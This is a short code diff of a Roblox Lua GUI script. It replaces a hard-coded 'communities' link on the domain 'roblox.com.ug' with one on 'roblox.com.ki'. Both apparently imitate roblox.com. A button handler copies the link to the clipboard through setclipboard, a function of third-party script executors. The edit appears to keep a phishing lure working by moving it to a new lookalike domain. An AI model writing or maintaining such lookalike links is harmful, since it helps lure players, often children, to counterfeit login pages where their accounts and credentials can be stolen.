@@ -59,7 +59,7 @@ local bcorner = Instance.new("UICorner")
 bcorner.CornerRadius = UDim.new(0, 6)
 bcorner.Parent = button
 
-local link = "https://roblox.com.ug/communities/7166769187/"
+local link = "https://roblox.com.ki/communities/7166769187/"
 
 button.MouseButton1Click:Connect(function()
 	if setclipboard then
